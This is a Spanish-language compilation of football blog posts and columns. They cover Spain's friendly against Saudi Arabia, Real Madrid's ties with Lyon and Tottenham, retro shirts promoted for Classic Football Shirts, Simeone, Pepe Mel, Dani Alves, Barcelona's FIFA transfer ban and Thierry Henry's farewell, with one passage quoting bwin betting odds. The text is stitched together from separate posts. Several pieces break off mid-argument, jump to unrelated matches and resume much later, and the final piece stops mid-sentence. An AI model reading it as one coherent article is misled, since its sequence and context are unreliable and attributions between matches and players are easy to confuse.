Colombia en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Pongamos estos partidos en su sitio justo. Son entrenamientos con público. Los jugadores no andan concentrados precisamente, ni se les va la vida en ellos. Ni arriesgan los músculos o los huesos a quince días de un Mundial. No estoy justificando un pobre partido de nuestra selección. O sí. Porque la primera parte ha sido terrorífica. Pases imprecisos, juego trabado, y hasta una pésima salida del habitualmente impecable Casillas que ha costado el primer gol de los saudíes. No jugarse nada ha sido una trampa para algunos futbolistas. Busquets ha vivido superado en la mitad del campo, Piqué ha estado despistado buena parte del partido, Sergio Ramos sin ninguna mordiente… “Perezosos”, como Vicente del Bosque ha dicho al final del encuentro. Adormilados ante la selección asiática, que demostró soltura y falta de complejos durante todo el choque. Es pronto para sacar conclusiones. Ni un hipotético  8-0 ni este apretado 3-2 sirven para nada. El equipo necesita recorrido y más frescura sobre el césped. Eso sólo lo da el entretenimiento. Dejemos que este partido se pierda en la memoria y no nos obliguemos a sacar sentencias precipitadas. Es un sano ejercicio para esta calurosa tarde de sábado.Hay algunas lecturas sencillas del partido jugado en la inolvidable Innsbruck. El equipo tiene dos planes. El primero, el “clásico” es parecido al que nos llevó a ganar la Eurocopa. Un 4-5-1 con mucho juego en el centro del campo, un delantero ingobernable como Villa y triangulaciones rápidas en las inmediaciones del área contraria. Ese plan, al menos hoy, no ha funcionado. Busquets no ha aportado serenidad defensiva y el equipo estaba más pendiente de sacar el balón medianamente limpio que de irse al ataque.En la ida desatascó el asunto en un ramalazo de nueve y se confía en él para hacer lo propio en la vuelta. Además el galo se entiende bien con Cristiano. Son dos nueves invisibles, distantes de la ortodoxia que pide la camiseta y precisamente por ello temibles. En particular se espera que un Cristiano fresco tenga la llave que la abra al Madrid la puerta de cuartos. Para volver a pasear por los pasillos nobles de la que siempre ha sido su casa.El resto deberán aportar movilidad a la receta. El centro del campo del Olympique no aguanta la comparación técnica con el merengue pero es correoso y sacrificado como pocos. Son chicles en la suela durante un día de verano y el Madrid deberá moverse y mover para asomarse a los huecos. Ya saben, a lo que digan Xabi y Özil. Atrás habrá tirar de retrovisor para pegarse a un listo como Lisandro y no permitir ni una alegría a balón parado. Clave puede ser esto último si hay cromos como Pjanic (que quizá sustituya al tocado Gorcouff) de por medio.El Madrid es favorito por historia juego y factor campo aunque las dificultades que siempre se han encontrado frente al Lyon no deben menospreciarse a la hora de la apuesta. bwin.com paga 1.35 € por la victoria del Madrid y 7.75 € por la del club francés. Números cantán. La clasificación gala se paga a 5. 25 euros. Antes de que arranque el Real Madrid-Tottenham de esta noche, jugosísima cena la que nos espera, déjenme que aliñe el plato con un par de ideas que me han venido a la cabeza tras leer la estupenda previa que del encuentro ha escrito Antonio Agredano en esta misma casa.Advierte Rafa Benítez en la edición de ayer de El Mundo que los londinenses cimentan su fortaleza en la variedad de recursos. Que es un equipo camaleón, un transformista que lo mismo puede sobar la pelota hasta hacerla desaparecer como ponerla a correr como alma que lleva el diablo. En la libreta de Redknapp hay sitio para el discurso inglés y para el continental. “Tiene velocidad con Bale y Lennon, aunque han estado tocados, buena circulación de balón, con jugadores técnicos como Van der Vaart y poder en el juego aéreo gracias a Crouch” Leo esto e inmediatamente pienso en que el distrito de Tottenham es la zona con mayor diversidad étnica de toda Gran Bretaña, con 113 grupos étnicos hablando cada día 193 lenguas diferentes. El estilo del equipo del barrio con la pelota no es sino un reflejo de esa variedad.Más tarde he pensado en que el hincha del Tottenham se merece saborear el éxito con mayúsculas de una vez por todas. En mi metáfora el club con el que esta noche se medirá el Madrid es un señor maduro y un poco pretencioso que  se calza su vieja camiseta blanca y se sienta frente a un proyector a ver la película de su propia vida. Una a una va observando diapositivas. Aquella de cuando el Arsenal, eterno rival precisamente por esto, les sopló el puesto en Primera División con un apaño histórico. Otra de cuando los gooners se mudaron a su barrio. A Sol Campbell decidiendo que sería estupendo convertirse en emblema del enemigo. A los de rojo descojonándose de sus torpes intentonas por asaltar la élite a base de talonario. Y la que más le escuece, al Arsenal haciendo suyo el juego elegante y refinado del que siempre habían presumido ellos. Pero a pesar de todo el tipo no pierde la compostura. Es educado, elegante y orgulloss. Y piensa que, ¡qué carajo! , ya es hora de hacer algo grande. Cada semana y de la mano de Classic Football Shirts: la tienda  especializada en camisetas antiguas, nos acercamos al fútbol con una  perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido  la historia del deporte rey.Comenzamos esta nueva sección invocando los fantasmas del pasado como homenaje al presente y, esperemos, heraldo de los éxitos futuros. Comenzamos recordando la camiseta que vistó la selección española de camino a y durante el Mundial de 1990. Ya saben, y espero que no huyan aterrados por el mal fario, la que llevaban nuestros chavales cuando los yugoslavos nos compraron el billete de vuelta a casa. Y la elástica, una Le Coq Sportif tan elegante como aconsejaba el diseño de la época, no es cualquier trapito. Que saliven los fetichistas. Con el número cuatro estampado en la espalda, la que ven en la fotografía es la  misma camiseta que vistió Genar Andrinua, baluarte norteño para el recuerdo y regular en la selección de los últimos ochenta, un 11 de octubre de 1989 durante el partido de clasificación contra Hungría disputado en el Népstadion, hoy Estadio Ferenc Puskás, de Budapest. España, encuadrada en aquella previa, junto a Hungría, Malta y la dos Irlandas, supo agenciarse el pasaporte mundialista con solvencia.Fue tan exiguo el Mundial 90 para España que tan sólo conocimos dos sedes. Del Friuli en Udine logramos arrancar tres puntos, ante los uruguayos y los surcoreanos, para encarrilar una clasificación que sellamos en el Marcantonio Bentegodi ante los belgas. La cosa pintaba dulce como nunca. Sin embargo, no hizo falta cambiar de aeropuerto, el Valerio Catullo de Verona nos esperó durante cinco ilusionantes días hasta que llegaron los yugoslavos.Siempre hay motivos para dejar en el banquillo al máximo goleador de una de las mayores ligas europeas, para salir sin delanteros o para, como Blanc anoche, tirar de trivote cuando llevas toda la fase de clasificación jugando con un esquema más ofensivo. De momento, el ex central del Barça se lleva una alforja llena de sospechas, y a cambio se dejó dos puntos ante un equipo inferior, kilos de favoritismo y la simpatía de los neutrales que esperábamos que la nueva versión de Francia no fuera más de lo mismo en la Eurocopa. Nos equivocamos. Cristiano. El sainete que se ha montado todas estas dos semanas, como gran parte de las que cosas que ocurren en torno al Madrid, ha llenado de detritus tanto al protagonista como al hatajo de corifeos que viven de darle mil vueltas a temas que no tienen más de dos. Vuelto el fútbol, se cerró la estupidez de la tristeza con quince minutos eléctricos, en los que el portugués fusiló a un espléndido Hart una y otra vez, y sobre todo con el gol final que celebró como debe celebrarlo un futbolista: con rabia, alegría, compañeros y público. Esperemos que así se clausure uno de los coñazos más duraderos e inanes que hemos tenido ocasión de soportar. La ovación a Silva. Llamativa por inesperada, no unánime pero ruidosa, la ovación a Silva ofrece un inmenso abanico de interpretaciones. Una más amable, y que el arriba firmante cree la más correcta, nos habla de agradecimiento a un fantástico jugador, modélico en actitud y piedra angular de la gran selección que ahora disfrutamos. Otras, con toque más capcioso, interpretan el aplauso como un reproche a Florentino por no haberlo fichado, e incluso como una reivindicación del talento frente al tópico que señala a Mourinho como un entrenador defensivo.No dio el extraño partido del Bernabéu lugar a demasiado análisis. Sin embargo, del abultado resultado y de la incomparecencia forzada del Rayo se entresaca uno de los mejores partidos del centrocampista-atacante-carrilero galés desde su llegada a la capital. Primera vez en su carrera que consigue anotar cuatro goles en un partido, el desordenado y anárquico correcalles en el que se convirtió la segunda parte le vino como anillo al dedo para explotar sus virtudes atléticas. Necesitaba Bale un partido así. Necesita el graderío del Bernabéu que se repita con mayor frecuencia.Ignacio Camacho. Apareció entre la bruma para capitanear la nave malaguista y ponerla en rumbo hacia buen puerto. El Málaga es otro con el aragonés frente al cuadro de mandos. Si no está, el Málaga es un equipo gris, plano, ramplón y sujeto a unas individualidades de las que ya no goza con tanta frecuencia con respecto al año pasado. Camacho corta, distribuye y atempera y resulta capital porque aglutina en sus botas virtudes que normalmente se suelen repartir entre varios futbolistas. El domingo, en el regreso de su tercera lesión en año y medio, se hizo dueño y señor de la zona de creación, anuló a Koke y desquició a Gabi para que Charles acabara rubricando la merecida victoria de los suyos. Auténtico jugador franquicia de La Rosaleda. Voy a abrirme en canal: no creía en el Atlético de Madrid. Sí, yo era uno de esos descreídos, de los agoreros que se apresuraron en vaticinar que pasaría lo mismo de siempre, que por pura lógica el equipo de Simeone terminaría desinflándose y viniéndose abajo, incapaz de resistir el tirón del rush final de la temporada. Que con una plantilla considerablemente más corta, pese a los retoques de mitad de temporada de Diego Ribas y José Sosa, no estaba en condiciones de competir con el poderío de Real Madrid y Barça. Creía que la eliminación en la semifinal de Copa precisamente ante el Real Madrid era el argumento definitivo que terminaría cargando de razones a los que, como yo, pensaban que la insolencia colchonera era flor de un día y que las exigencias de la temporada acabarían agostando el vergel cholista.Vale, me equivoqué.Dice Simeone que o se le sigue, o no se le sigue, que el liderazgo es ‘algo que no se puede explicar‘. Y me lo imagino ejerciendo una autoridad casi marcial sobre sus jugadores, convenientemente matizada por un aura paternalista sobre todos ellos. Exigiendo a la vez que protegiendo. A medio camino entre el sargento chusquero que pasó de fregar letrinas a pegar voces a sus subordinados y la aparición mesiánica bajo halo de santidad. Una de esas figuras ante las que solo cabe mostrar pleitesía y agradecimiento por parte de sus seguidores.No voy a cambiar mi idea sobre el repetitivo discurso del Cholo. Me resulta cansino y, de tanto repetirlo, se me ha vuelto insípido, como un chicle pesadamente masticado durante dos largas horas. Lo veo extremadamente populachero, tratando de buscar siempre la conexión íntima con la grada, con aquellos que lo tienen que dar por bueno, aún a costa de caer con frecuencia en el estereotipo facilón a veces hasta límites ridículos. A lo mejor es que a mí me resulta vulgar porque no me afecta ni me motiva personalmente, pero resulta que a su equipo le funciona y que la grada ha encontrado en Simeone una extensión ideal hacia el área técnica. Simeone grita, anima, protesta, festeja como lo haría el abonado número 10.458 o el ocupante de cualquier asiento de la grada de Preferencia. Es más, resulta que su gente y su afición han encontrado una gasolina de altísimo octanaje en el discurso del argentino, y que con ese combustible se han dado cuenta de que se han colocado a la altura de los dos colosos y, como poco, de los ocho mejores equipos del continente en la actualidad. Cualquiera discute ahora la metodología cholista.No soy quién para juzgar los métodos de Simeone, pese a que pueda tener una determinada opinión sobre ellos, y aunque lo fuese mis argumentos serían rápidamente desnudados ante la reiterada exhibición colchonera de la presente temporada. Lo único que sí puedo juzgar son sus resultados y ahí sí que se ha ganado mi voto. Más allá del partido a partido, de vivir el día a día, del tempus fugit y del carpe diem. ‘Nos queríamos, nos destrozábamos mutuamente las vidas‘, cantaban los siempre referenciales Antònia Font en ‘Tots es motors‘ mientras, así como quien no quiere la cosa, nos dejaban una lección magistral de vida. Pepe Mel y el Real Betis se han querido mutuamente. Se han amado e incluso se han deseado con desmedida pasión. Tanta pasión que unos y otro acabaron por perder el control de sus emociones. Y fue entonces cuando empezaron a hacerse daño.Puede que aquellas muestras de cariño que la masa social bética dirigió al ya extécnico verdiblanco allá por el mes de diciembre del año 2013, cuando el consejo de administración de Heliópolis decidió prescindir de sus servicios mientras el equipo se precipitaba hacia el abismo, fuesen desproporcionadas. Fue el principio del fin. El momento en el que el beticismo le hizo ver a Mel que no había otro como él. Y así ocurrió que un año más tarde de su salida, y tras una breve experiencia en Inglaterra, Pepe volvió al Villamarín para devolver al equipo a Primera. No es que pareciese el idóneo, es que parecía el único.Mel regresó con el Betis a Primera.Hasta que entró en escena el pie derecho de Stojković para firmar dos obras de arte, una cincelada en un recorte genial y otra, postrera, agónica, de medido libre directo para superar la desidia de Míchel y la estirada de Zubizarreta. Julito Salinas había inyectado adrenalina al choque en el 83 pescando un centro en boca de gol pero de nada sirvió. España recogía el pasaporte, comme d’habitude. Yo tenía diez años cuando se celebró aquel campeonato del Mundo y mis recuerdos son vagos. Apenas el nerviosismo anterior al inicio de los partidos, ofuscado con atender al televisor y conseguir programar a tiempo el recién estrenado reproductor VHS. También la gran decepción de los octavos, aunque a eso no tardaría en acostumbrarme, la selección obliga, con el paso de los años. Recuerdo que Luis Suárez había montado un buen equipo. Transmitíamos solidez y teníamos unos pocos futbolistas con verdadera clase. Lo que se dice un equipo majo. Recuerdo el partidazo de Rafa Martín Vázquez, descollante, contra los yugoslavos. También a Míchel paseando por Corea, al Buitre, a Villaroya y Manolo Jiménez por la izquierda y a Górriz martilleando de cabeza, especialidad de la casa, el único gol de su carrera internacional ante Bélgica en primera fase. Perdimos, sí, pero guardo buenos recuerdos.Y cuando miro la equipación que lucía aquella España de toda la vida que en ocasiones jugaba bien y perdía  invariablemente, la roja con pantalón azul y media negra, aquellas “Le Coq Sportif” con cuello bordado por las que más de uno hubiésemos vendido el alma al diablo durante nuestra infancia, pienso que nunca jamás hemos saltado con tanta elegancia al terreno de juego. Más tarde apareció “Adidas” con sus diseños imposibles, aquellas aventuras en rojigualda con más rombos de los que Javier Clemente era capaz de dibujar en una pizarra o los delirios duotono de la Eurocopa del 96 y las cosas dejaron de ser lo mismo. También llegó un gol de Fernando Torres en Viena, Iniesta, Xavi, Villa y compañia y, efectivamente, nada volvió a ser lo mismo.Puedes comprar esta camiseta y cientos más en Classic Football Shirts ¿Seré masoquista? Lo pienso después de acabar este mapa con todos los estadios en los que jugó el Real Oviedo desde 2003 a 2015. Una cartografía de la desgracia, un plano para recordar los paseos por la calle oscura y sonreír ahora que vivimos en un barrio apañado. En el dibujo faltan las moscas en el parabrisas por alguna nacional perdida. Tampoco verás los domingos sin cenar ni las humillaciones a veinte kilómetros o a un aparcamiento de distancia. El mapa no alcanza para explicar el gustazo inolvidable de limpiarse los calzones a la orilla del Atlántico tras doce años revolcándonos en los barrizales. Pero que cualquier oviedista pruebe a unir los puntos de esta carretera al infierno, de esta autopista hacia el cielo, y me diga si no mereció la pena. Que me lo diga. En el invierno del 64 los dos negocios favoritos de la masa, el de la pelotita y el musical eran asunto de Liverpool. Estaban los Searchers, Billy J.Kramer y los Dakotas y por supuesto los Beatles.Pero lo hizo bajo otro contexto social bien diferente. Con la entidad fracturada, con la duda permanentemente encima, planeando como un buitre sobre su figura y agotando su ideario hasta que la inseguridad se adueñó de sus planteamientos. El equipo dejó de mirar a Rubén Castro, Ceballos o Joaquín, y empezó a mirar hacia Petros, N’Diaye y Digard. Arrinconó el talento con la idea de amurallarse en torno a Antonio Adán. Comenzó la sangría de puntos, subieron los decibelios y Mel empezó a hacer daño a ese Betis al que tanto quiere. Disparó con contundencia hacia Eduardo Maciá, director deportivo bético. Renegó en diciembre de lo que en agosto le había parecido adecuado y arrancó una temeraria carrera en la que parecía aferrarse a la estúpida idea de que si el Betis no lograba ser feliz con él, no lo sería con nadie. Donde debió de buscar estabilidad y paz provocó agitación y una preocupante sensación de descontrol generalizado y de inoperancia ante la fragilidad del equipo.La actitud de Pepe Mel fue suicida durante las últimas semanas, pero al ya extécnico verdiblanco se lo ha llevado por delante la misma planificación deportiva deficiente que ya se lo llevara corriente abajo hace un par de años. Otra vez la historia del eslabón más débil, del ‘es más fácil echar a uno que a diez’. Otra vez un equipo desnortado y girando en espiral hacia el sumidero. Otra vez la historia reciente del Betis, fiel a su cita. Alen Halilovic. Hace apenas siete días comentaba en un círculo de amigos que el partido en San Mamés del joven croata cedido al Sporting por el FC Barcelona me había parecido profundamente decepcionante y repleto de decisiones equivocadas. Solo una semana después, contra el Málaga, las sensaciones ha sido diametralmente opuestas. Maduro, líder y decisivo. Un rayo de luz sobre El Molinón. Guajilovic.Iñaki Williams. Indiscutible en el actual Athletic de Valverde, el joven canterano rojiblanco empieza a agradecer la confianza ciega de su técnico. Dos goles en el Villamarín y una auténtica pesadilla para la defensa bética por su movilidad, su verticalidad y su punta de velocidad. Le falta un punto de temple, algo lógico a su edad, pero el aporte de su vitalidad al Athletic es indiscutible. Pablo Hernández. Tras un primer año en Balaídos de veredicto incierto, el chileno es protagonista indiscutible del gran momento de forma del Celta del Toto Berizzo. El sábado decidió el choque de Anoeta, dando dos puntos a los suyos, con un golazo cuando el partido ya expiraba. El gol nos ayuda a destacar al Tucu, pero no es más que una anécdota en el global de su fantástico rendimiento en la actual campaña.Sergi Roberto. El canterano azulgrana ha pasado de ser un futbolista perfectamente prescindible, intrascendente y sin sitio en el equipo de Luis Enrique, a encontrar su sitio como carrilero diestro. El sábado dio los dos goles de su equipo a Luis Suárez (con espectacular taconazo para habilitar al uruguayo) y Neymar. Curiosamente, lo hizo volviendo a aquella posición en el césped que nos lo había descubierto como un centrocampista insípido y perfectamente prescindible. Siendo tan versátil y polivalente, su utilidad queda fuera de toda duda.Carles Puyol. Sí, Carles Puyol. Por extraño que suene, el nombre del excapitán barcelonista es motivo de comentario al hilo de la patochada protagonizada por los que fuesen sus compañeros tras el partido del Coliseum getafense, dejando para el recuerdo una escena bochornosa e impropia de un club de fútbol profesional. Cuesta creer que bajo su mandato y su autoridad se hubiese permitido un disparate semejante. Con su adiós, es evidente, el Barça no solo perdió un bravísimo defensor. Dani Alves nunca ha destacado por ser una persona discreta. Más bien al contrario, el lateral brasileño del FC Barcelona siempre ha destacado por su hiperdesarrollada locuacidad, su extravagancia en el vestir y su falta de mesura en las formas. Como una especie de estereotipo andante, Alves es una sonora excepción en un mundillo, el de los futbolistas, generalmente dominado por la asepsia y la insustancialidad. No se calla, dice lo que piensa (aunque a veces no piense lo que dice), y se toma una serie de libertades a la hora de expresar sus sensaciones y sus pensamientos que no siempre tienen un efecto positivo, ni en su club ni en el propio futbolista. Entre la sinceridad y la falta de respeto existe una frontera demasiado difusa.Dani apuntó, tras la debacle del José Zorrilla del pasado sábado, contra no se sabe muy bien quiénes. En cuanto encontró un púlpito desde el que expresarse, disparó sin pensar. ‘Quien no confíe en nosotros, que se baje del barco‘, amenazó entonces el lateral.Sobre el verde, Shankly rescataba al Liverpool del infrafútbol y lo disparaba al cielo. Todos miraban al Mersey. Hasta que apareció Glad all over. Durante ese mes de enero las ondas volvieron a ser territorio  capitalino gracias a cuatro chavales del norte de  Londres,  los Dave Clark Five, que lograron incrustar un par de minutos de beat pegajoso en los transistores de toda Gran  Bretaña hasta embolsarse el número uno de las listas. Eran lo más. Mientras tanto, otro grupo londinense bastante mas mugriento, el Crystal Palace, paseaba su pena under por la Tercera División hasta que su hinchada decidió adobar la situación con algún himno alegre. Se apropiaron del soniquete de moda. Así, desde 1964 y cada vez que las águilas saltan al césped de Selhurst Park los altavoces escupen Glad all over, el Holmesdale se arranca en coros y palmas para dar la bienvenida a los chavales con clase. Y para darnos envidia a muchos. Ya se conocen los partidos de la próxima ronda de dieciseisavos de final de la Copa del Rey. Los dieciseisavis de ese trofeo del que nadie se acuerda salvo aquellos que tienen la ocurrencia de aparecer por la final. Aun así y arriesgándome a que nadie lea este breve, a que quede como una de esas tribunas tantas veces desiertas en tantos partidos coperos, les informo de que la eliminatoria, que se disputará de nuevo bajo el infame sistema de doble partido los días 27 de octubre y 10 de noviembre, ha quedado configurada con algún que otro partido interesante. A los dos grandes clubes del fútbol patrio les han caido en suerte, y nunca mejor dicho, Ceuta y Murcia. El Madrid bailará con los pimentoneros y el Barcelona con los ceutís.El lugar común copero que propone la eliminación de un primera a manos del esforzado infrafutbolero (excluyo aquí la Segunda B) queda reservado para el Getafe. En dicho escenario morboso los azulones se las tendrán que ver con el Portugalete, único superviviente de los equipos que entraron en el bombo representando a la Tercera División. Veremos como comienza a capear la plantilla de Míchel el reto tricéfalo al que se han encomendado en este curso. Otros modestos a los que el sorteo les ha proporcionado 180 minutos de esperanza y un jornada propicia para la hostelería son el Real Unión de Irún (van contra el Sevilla), la UD Logroñés (Valencia), el Universidad de Las Palmas (Atlético de Madrid) y el Poli Ejido (Villarreal). Otros duelos harto interesantes al menos sobre el papel son los que se viviran con el Valladolid-Espanyol y el Betis-Zaragoza. Aroma a fútbol de toda la vida. Además, varios han sido los primeras que se han cruzado: Osasuna – Deportivo de La Coruña, Real Sociedad – Almería, Hércules – Málaga y Mallorca – Sporting. Y para terminar, la mística. la sensación de la pasada edición, aquel Alcorcón que puso al Real Madrid a empaquetar maletas antes de tiempo buscará repetir proeza ante un clásico copero: el Athletic Club de Bilbao.Todos los partidos de dieciseisavos Arsène Wenger lo ha vuelto a hacer. Enfrascado en una aplicada carrera de larga distancia por borrar todo rastro del Arsenal bruto que alimentaba el motor con galones de veteranía y whisky ha vuelto a engendrar un guion perfecto en el que no faltaron dos tics característicos, muy suyos. Presentó en sociedad un cromo lampiño y perdió el partido contra un rival directo. El Humbert Humbert del fútbol mundial, como le describe con infinita sorna un amigo mío, hizo debutar anoche en Old Trafford (1-0) a Wojciech Szczesny, portero polaco con 20 años en el cuentakilómetros y escaso vuelo en noches de élite. Al tiempo y como es tradición, el Arsenal solo ha vencido allí en tres ocasiones desde que Wenger agarró las riendas en 1996, volvió a cascar en el Teatro de los Sueños.Para mí Busquets debe ser titular en el primer partido del Mundial. Me gusta su consistencia, su capacidad para estar en todas partes, su sacrificio en los pasillos laterales, y su valentía en el choque. Creo que España ha sido históricamente, salvo excepciones muy puntuales, un equipo blando. Con poca refriega. A los amantes de la pulcritud les parecerá una barbaridad, pero esos parones en el juego, esa otra vía de este deporte, la del “juego sucio” es necesaria para avanzar en las eliminatorias. Busquets está en todas, las busca, leí a Xavi en una entrevista en la que decía que Busquets le gustaba porque era “leñero”. Intuyo en sus palabras, las de un jugador con la creación y la elegancia por bandera, que es imprescindible ese otro juego subterráneo para cimentar los equipos, para hacerlos competitivos. En todo caso, hoy ni una cosa ni otra. Puede ser falta de confianza, o una simple pájara en la plácida tarde austriaca. El segundo plan, el “nuevo” de Del Bosque es el aprovechamiento de las bandas. Tras el fallido intento con Capel, Jesús Navas ha venido para abrir el campo a lo largo. En la segunda parte, tras disfrazar al equipo con un cuádruple cambio, el entrenador consiguió enriquecer el poder ofensivo de la selección. Dentro de ese nuevo plan me encantó el despliegue de Pedro. Viene en un estado de forma sublime, se ha destapado como la gran revelación en el Barça de este año y ha dejado algunos detalles preciosos, de jugador especial, de futbolista desequilibrante, de eso que se llama recurso revulsivo pero aquí llamaremos recurso decisivo.El empate de Arabia, tras los goles de Villa de cabeza tras asistencia del renacido Iniesta y un zapatazo de Alonso que fue a la red con algo de fortuna, vino de carambola tras un tiro lejano de Al-Sahlawi. El partido parecía acabado. Era un resultado intrascendente. Lo importante era sacar conclusiones, aunque Llorente salió al campo para maquillar el flojo encuentro de La Roja. Un corner sacado por Xabi, el ariete del Athletic cabeceó a portería inapelable. Ahí está otra de las virtudes del equipo. El balón por alto o la jugada a balón parado, recursos utópicos para un combinado de jugadores menudos, tiene en Piqué, Llorente y Torres una nueva vía de éxito. Veremos el siguiente amistoso, con el conjunto más rodado. No se ha visto a Del Bosque demasiado preocupado pero no olvida que en algunas fases del juego los futbolistas no estuvieron a lo que tenían que estar. De estos partidos, del desempeño que jugadores claves tengan en las pachangas pre-mundialistas, saldrá un once titular que aún no está decidido. Ahí tenemos la gran virtud de la selección española. Hay tantas variantes, tantas combinaciones posibles, tantas maneras de plantear un equipo solvente, que no hay jugadores imprescindibles. Javi Martínez ha demostrado en unos pocos minutos que está preparado para jugar, Pedro, Llorente con su gol, Arbeloa en la izquierda, un incisivo Navas… Tras un partido aburrido e impreciso, hoy toca ilusionarse con el potencial de un equipo que, mal que pese a los supersticiosos como yo, va a Sudáfrica de favorito. Cuando hay tormenta dentro, no hay nada como buscar a la familia para espantar las nubes. En esas estaba cuando fui a Sevilla este fin de semana. Necesitaba el calor de los míos. Mi familia no es italiana pero lo parece. Los nuestros son los nuestros y el resto están de prestado. La sangre es un intangible dictatorial. Tras el almuerzo, apurando la última copa de vino, mi primo me pidió que le acompañara con la guitarra mientras cantaba una canción llamada `Core ´ngrato´. Chapurreé los acordes como pude mientras su voz portentosa que ahora empieza a forjarse en el Conservatorio derramaba con calor cada sílaba de esa hermosísima canción napolitana. Catarí, Catarí…Me emocioné. Por eso pensé en fútbol. Si hay un equipo de corazón ingrato es el Nápoles. Sólo en un club como este pudo un héroe trágico como Maradona agrandar su leyenda. El fútbol italiano está siempre bajo sospecha. Yo creo que este año está siendo la liga más entretenida de Europa, que la alternancia de poder es real –quizá por los baches por los que pasan dos grandes como Inter y Milan- y, por supuesto, yo voy con el Nápoles. No estoy exento de esa moda de sentir colores que no son los propios. Soy humano. Homo sum, futboli nihil a me alienum puto.Este fin de semana Roma y Nápoles se jugaban mucho más que el liderato. No sólo vale ser fuertes, también hay que parecerlo. El Derby del Sole venía a dilucidar quién iba más en serio en ese asalto a la Liga, un campeonato que la Roma ganó por última vez hace más de diez años y el Nápoles hace más de veinte. La Roma está haciendo un juego exquisito dirigida por Rudi García. Su liderato es incontestable, inmaculado, con una solidez defensiva pasmosa y un ataque rápido y expeditivo. El Napolés es otra cosa. Está Benítez y los que hemos visto los equipos del entrenador español sabemos que su fútbol cambia como una veleta en el tejado. Suelen ser equipos romos, cerrados, con transiciones rápidas, con líneas muy unidas. Pero también impredecibles, caprichosos. Con goles inesperados en portería propia y ajena. Aún así, el club partenopeo había conseguido cierta estabilidad con Reina, Insigne, Callejón, Hamsik e Ilner como espina dorsal del proyecto. Cabía la sorpresa. Una sorpresa que no se dio.El partido no fue plácido para los giallorossi.No era ni mucho menos la primera vez en la que Alves daba indicaciones a los aficionados sobre cómo deben estos expresar e interpretar su particular barcelonismo. Como si se tratase del oráculo de la culerada o de ese guía espiritual encargado de pontificar sobre lo que está bien y lo que está mal. Anoche ‘parece’ (y digo parece porque el propio jugador ha reculado torpemente tras el episodio de la celebración de su gol) que Dani volvió a tomarse unas libertades y a asumir unas tareas que no le competen. Con un muestrario de gestos más que evidentes, el lateral pareció demandar más intensidad en los ánimos a su público. Cree Alves que está en disposición de exigir, de pedirle a un público que es soberano y que ya paga suficiente peaje con su entrada o su abono cómo cree él que debe de comportarse. Así se anima, así no. Y se equivoca gravemente.No voy a entrar a valorar si los gestos de ayer se corresponden a una coreografía del tal Pitbull, como afirma el futbolista, o si son fruto de un nuevo chispazo del cable pelado ese que atormenta al brasileño cada cierto tiempo. Es más, aun creyéndome la peregrina explicación coreográfica, pienso que una celebración tan, como poco, confusa no ayuda en mucho a la estabilidad de un ambiente que aparece algo más agitado de lo deseable en las últimas semanas. ¿Por qué no evitar lo evitable? ¿Por qué no prescindir por unos días de esa necesidad permanente de expresarse? ¿Por qué no sumar, en lugar de restar? Alves parece olvidar que muchísimo antes de su llegada al Camp Nou el Barça y el barcelonismo ya existían y que, pese a no contar con su inestimable ‘Guía del buen barcelonista‘, las cosas no iban del todo mal por allí. Confieso que aguardaba el anuncio oficial del primer fichaje del FC Barcelona 2015/16 con un morbo insano, mezcla de curiosidad, incredulidad y, sí, por qué no, cierta dosis de indignación. La sanción recaída hace poco más de un año sobre el club azulgrana a raíz de diversas irregularidades detectadas en  traspasos y posteriores inscripciones de algunos futbolistas menores de edad entre los años 2009 y 2013, por la que la Comisión Disciplinaria de la FIFA resolvió imponer al Barça la prohibición de realizar nuevas incorporaciones de futbolistas (sanción que fue confirmada por el TAS hasta el mes de enero del año 2016), había colocado a la entidad catalana en una complicada tesitura de cara al futuro inmediato. O eso presumíamos. Ocurrió que meses después la sanción fue matizada y maquillada: el Barça no podría inscribir nuevos futbolistas en las competiciones pero sí que podría vincularlos contractualmente con el club. Hecha la ley, hecha la trampa. El daño se minimizaba así muy notablemente.El tarraconense Aleix Vidal, jugador de moda en la recta final de la temporada recientemente concluida y con una cotización descaradamente al alza tras el brillante sprint final del Sevilla, ha sido el primero en confirmar que el FC Barcelona no iba a tener miramiento alguno a la hora de contratar futbolistas que no podrán vestirse de corto hasta el próximo mes de enero por razón de la sanción FIFA. Porque ni tan siquiera el considerable hándicap de no poder jugar hasta dentro de casi siete meses ha supuesto impedimento alguno para que el Barça pudiera incorporar al futbolista a sus filas.Entiendo que el tren del Barça, como lo hubiese sido el del Madrid, solo pasa una vez en la vida de futbolistas como Aleix Vidal. Por eso comprendo la decisión del jugador. Queda en la historia de este fichaje y en las de los que, a buen seguro, continuarán llegando durante este verano a Can Barça el regusto de que las imposiciones de la FIFA en forma de sanción quedan absolutamente desvirtuadas ante el poderío económico y la capacidad de persuasión de un club contra el que prácticamente nadie puede, ni en capacidad económica ni en perspectiva de éxitos inmediatos, competir. El poder coercitivo del máximo organismo del fútbol mundial puesto en entredicho ante la fuerza desmedida de aquellos sobre los que tiene que gobernar. Una vez más. Y allí estaba Thierry Henry. La gacela de Les Ulis, la leyenda gunner, el que un día fuese uno de los delanteros más decisivos de toda Europa, despidiéndose de sus rivales, felicitándolos uno a uno por el triunfo y por su clasificación para la final de la MLS Cup. En un momento tan especial, con el eco del que probablemente fuese el último pitido final de su prolongada carrera deportiva aún retumbando en su oído, el atacante francés aún tuvo cuajo para olvidarse de sí mismo y centrarse en ese acto tan ceremonial y respetuoso. Fue el único de los suyos. Porque, aunque aún no hay confirmación oficial, todo apunta a que Titi pondrá punto final a su trayectoria futbolística con el partido que enfrentó anoche, hora europea, a New York Red Bulls contra New England Revolution, en la final de la conferencia este de la MLS norteamericana. Su contrato con la entidad neoyorquina finaliza este año, y ninguna de las partes se ha pronunciado hasta el momento sobre la posibilidad de extender el vínculo.Quizá por eso el hipotético adiós de Thierry Henry haya quedado algo descafeinado. Porque la incertidumbre planea sobre su futuro y por esa especie de clandestinidad que siempre supone disputar un partido en ultramar. No merecía el francés apagar la luz de su zancada ágil y elegante sumido en un escenario casi invisible. Su adiós oculto, casi invisible, nos obliga a quedarnos con lo mejor de su carrera a modo de holograma. Con una retahíla de highlights (más como gunner que como barcelonista, todo sea dicho) en los que Titi galopa grácilmente en diagonal hacia la portería rival, con los ojos muy abiertos y la mirada fija en ningún sitio y en todos a la vez. Elegante, suelto, dominador, con una cilindrada desbordante en las piernas y una precisión robótica ante la suerte del gol. Nos negaremos a recordarle por un tenebroso ocaso que no hizo justicia a su muy meritoria carrera. Henry será siempre el legendario estandarte de los Invincibles, el campeón del mundo y de Europa con la selección francesa, de 